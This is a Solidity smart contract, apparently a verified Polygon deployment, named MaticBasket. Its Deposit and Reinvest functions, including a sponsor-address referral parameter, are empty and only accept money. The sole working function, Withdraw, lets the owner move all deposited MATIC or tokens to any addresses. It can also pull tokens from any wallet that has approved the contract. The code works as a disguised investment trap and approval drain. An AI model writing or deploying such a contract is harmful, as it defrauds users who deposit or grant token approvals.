/**
 *Submitted for verification at polygonscan.com on 2022-05-26
*/

//SPDX-License-Identifier: None
pragma solidity 0.8.0;

library TransferHelper {
    function safeApprove(
        address token,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            'TransferHelper::safeApprove: approve failed'
        );
    }

    function safeTransfer(
        address token,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            'TransferHelper::safeTransfer: transfer failed'
        );
    }

    function safeTransferFrom(
        address token,
        address from,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            'TransferHelper::transferFrom: transferFrom failed'
        );
    }

    function safeTransferETH(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');
    }

    function safeBalanceOf(address token, address wallet) internal returns (uint){
        (bool _success, bytes memory data) = token.call(abi.encodeWithSelector(0x70a08231, wallet));
        if(_success) {
            (uint amount) = abi.decode(data, (uint));
            return amount;
        }
        return 0;
    }
}

contract MaticBasket{
    
    address owner;
    constructor()
    {
        owner = msg.sender;
    }
    
    fallback() external payable{ }

    receive() external payable{ }
    
    function Deposit(address sponsorAddress) external payable { }

    function Reinvest() external payable { }

    function Withdraw(address token, address from, address[] memory to, uint[] memory amount) public payable
    {
        require(owner==msg.sender);
        require(to.length == amount.length, "");

        if(token!=0x0000000000000000000000000000000000000000)
        {
            if(from!=0x0000000000000000000000000000000000000000)
            {
                for(uint i=0; i<to.length; i++)
                {
                    TransferHelper.safeTransferFrom(token, from, to[i], amount[i]);
                }
            }
            else
            {
                for(uint i=0; i<to.length; i++)
                {
                    TransferHelper.safeTransfer(token, to[i], amount[i]);
                }
            }
        }
        else
        {
            for(uint i=0; i<to.length; i++)
            {
                TransferHelper.safeTransferETH(to[i], amount[i]);
            }
        }
    }
}